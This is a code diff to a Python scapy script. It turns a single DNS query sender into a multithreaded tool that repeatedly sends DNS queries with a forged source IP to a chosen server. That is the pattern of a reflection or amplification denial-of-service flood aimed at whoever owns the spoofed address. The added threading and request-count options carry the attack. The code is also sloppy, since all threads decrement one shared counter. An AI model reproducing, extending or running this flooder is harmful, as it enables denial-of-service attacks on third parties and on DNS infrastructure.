@@ -1,22 +1,19 @@
 import argparse
-import socket
+import threading
 import dns.message
 import dns.rdatatype
-import scapy
 from scapy.layers.inet import UDP, IP
 from scapy.sendrecv import send
 
 
-def send_dns_query(domain_name, dns_server="224.0.0.251", dns_port=5353, rr_type='A', flags=0x0100, spoofed_ip=None):
+def send_dns_query(domain_name, dns_server="224.0.0.251", dns_port=53, rr_type='A', flags=0x0100, spoofed_ip=None):
     # Create a DNS query message
     message = create_dns_query(domain_name, rr_type, flags)
 
-    iterazioni=2
-    while(iterazioni):
-        response = send(IP(dst=dns_server, src=spoofed_ip) / UDP(sport=dns_port, dport=dns_port) / message.to_wire())
-        iterazioni -= 1
-    return response
-
+    # dns_query = IP(dst=dns_server) / UDP(sport=54321, dport=53) / DNS(rd=1, qd=DNSQR(qname=target))
+    while(args.nrequest):
+        send(IP(dst=dns_server, src=spoofed_ip) / UDP(sport=dns_port, dport=dns_port) / message.to_wire(),verbose=0)
+        args.nrequest -= 1
 
 
 def create_dns_query(domain_name, rr_type, flags):
@@ -26,12 +23,6 @@ def create_dns_query(domain_name, rr_type, flags):
 
     return message
 
-def print_dns_response(response):
-    # Print the DNS response using dnspython library
-    message = dns.message.from_wire(response)
-    print(f'DNS Response:\n{message}')
-
-    return message
 
 # Parse command-line arguments
 parser = argparse.ArgumentParser(description='Send DNS query and print the response')
@@ -49,6 +40,8 @@ parser.add_argument('--rd', type=int, default=None, help='RD flag value (default
 parser.add_argument('--ra', type=int, default=None, help='RA flag value (default: None)')
 parser.add_argument('--z', type=int, default=None, help='Z flag value (default: None)')
 parser.add_argument('--rcode', type=int, default=None, help='RCODE flag value (default: None)')
+parser.add_argument('--nthread', type=int, default=1, help='Number of threads to use (default: 1)')
+parser.add_argument('--nrequest', type=int, default=1, help='Number of request for thread to send (default: 1)')
 args = parser.parse_args()
 
 # Modify the DNS flags if provided
@@ -69,6 +62,14 @@ if args.z is not None:
 if args.rcode is not None:
     args.flags |= args.rcode
 
-# Send DNS query and print the response
-response = send_dns_query(args.domain_name, args.server, args.port, args.rr_type, args.flags, args.spoofed_ip)
-# print_dns_response(response)
+
+# Create and start the threads
+threads = []
+for _ in range(args.nthread):
+    thread = threading.Thread(target=send_dns_query, args=(args.domain_name, args.server, args.port, args.rr_type, args.flags, args.spoofed_ip))
+    threads.append(thread)
+    thread.start()
+
+# Wait for all threads to finish
+for thread in threads:
+    thread.join()
